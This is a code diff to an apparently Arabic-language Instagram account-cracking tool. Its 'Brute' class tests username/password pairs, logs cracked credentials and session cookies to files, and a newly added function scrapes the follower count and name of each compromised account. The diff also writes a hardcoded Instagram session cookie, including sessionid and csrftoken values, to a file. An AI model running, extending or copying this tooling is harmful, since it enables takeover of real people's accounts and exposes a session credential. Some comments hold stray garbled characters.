@@ -146,6 +146,45 @@ PP="\033[1;35m"
 CC="\033[1;36m"
 
 
+import requests
+import bs4
+from rich.console import Console
+
+console = Console()
+def cek_DYNO(user, cookie_file_path):
+    session = requests.Session()
+
+    # قراءة الكوكيز من الملف
+    try:
+        with open(cookie_file_path, 'r') as file:
+            kuki = file.read().strip()  # قراءة الكوكيز من الملف
+    except Exception as e:
+        print(f"حدث خطأ أثناء قراءة الملف: {e}")
+        return
+
+    # زيارة صفحة الملف الشخصي في Instagram باستخدام اسم المستخدم
+    url = f"https://www.instagram.com/{user}/"
+    w = session.get(url, cookies={"cookie": kuki}).text
+    sop = bs4.BeautifulSoup(w, "html.parser")
+    
+    # استخراج عدد المتابعين من الميتا تاج
+    try:
+        followers_count = sop.find('meta', property='og:description')['content']
+        followers_count = followers_count.split(' ')[0]  # استخراج الرقم فقط
+
+        # استخراج الاسم الكامل من الميتا تاج (يتطلب بعض التعديلات)
+        full_name = sop.find('meta', property='og:title')['content']
+        full_name = full_name.split('•')[0].strip()  # استخراج الاسم الكامل قبل "•"
+        
+        console.print(f"\r\n[bold yellow]           ➛ followers : {B2}{followers_count}\n[bold yellow]           ➛ full name : {B2}{full_name}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
+        
+    except Exception as e:
+        console.print(f"\r [red]  Error: {e}")
+
+# كيفية الاستخدام:
+cookie_file_path = '/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/rayen.txt'  # المسار إلى الملف
+
+
 
 
 def Menu():
@@ -157,7 +196,7 @@ def Menu():
         Console().print(f"""\033{Na}
 
                           _______________
-                        𖣘 < 𝐓𝐄𝐀𝐌 <> 𝐀𝐑𝐖 > 𖣘 𝚅3.
+                        𖣘 < 𝐓𝐄𝐀𝐌 <> 𝐀𝐑𝐖 > 𖣘 𝚅3.-
                      """)
         # Check for saved cookies status
         print('''
@@ -484,8 +523,8 @@ class Brute:
                         # استخدام القفل أثناء الكتابة
                         with lock:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
-                            console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
-
+                            console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n")
+                            cek_DYNO(user, cookie_file_path)
 
                 
                  elif 'two_factor_required' in str(response.text):
@@ -497,8 +536,8 @@ class Brute:
 
                     self.cp += 1
                     open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
-                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
-
+                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
+                    cek_DYNO(user, cookie_file_path)
 
                     break
 
@@ -507,7 +546,6 @@ class Brute:
         self.lp +=1
 
     
-import os
 
 if __name__ == "__main__":
     try:
@@ -532,6 +570,9 @@ if __name__ == "__main__":
             with open(os.path.join(accounts_folder, 'حسابات-CP.txt'), 'w') as file:
                 file.write("")
 
+        if not os.path.exists(os.path.join(list_folder, 'rayen.txt')):
+            with open(os.path.join(list_folder, 'rayen.txt'), 'w') as file:
+                file.write("datr=chx1Z8FM3FQREhpSvRYdMvwE; ig_did=C8B37CEC-0B24-44FB-9117-C152B88F8A3B; dpr=1.6687500476837158; mid=Z3UccgABAAGXnxA485TVnIICDkAx; ig_nrcb=1; ps_l=1; ps_n=1; csrftoken=SwonmmPEujnMf695NVOT9ZgPSyFgU1sW; ds_user_id=63532616272; sessionid=63532616272%3ABoNdkoEq1vChS4%3A24%3AAYeBidNep534HC8lx10l6muE_TVSyRoVIFYC4cls5A; wd=432x887; rur=CLN\05463532616272\0541767277357:01f71f760aad5569b21ed68e45e05bc76c6a0dfbf254d78ae31043e51e771cb77b8e6232")
 
         print("")
 
@@ -539,7 +580,7 @@ if __name__ == "__main__":
         print(f"حدث خطأ : {e}")
     
     # استكمال العمل بعد إنشاء المجلدات والملفات
-    brute = Brute()  # كائن من الفئة Brute-+--
-    Menu()           # عرض القائnnمjjbjة أو nتنفيذ اyyلخياراتgh
+    brute = Brute()  # كائن من الفئة Brute
+    Menu()           # عرض القائnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhhhhy𝚑𝚞𝚞jjتت
+    #bhgوتyyyتتتتناتتjjhhhhy
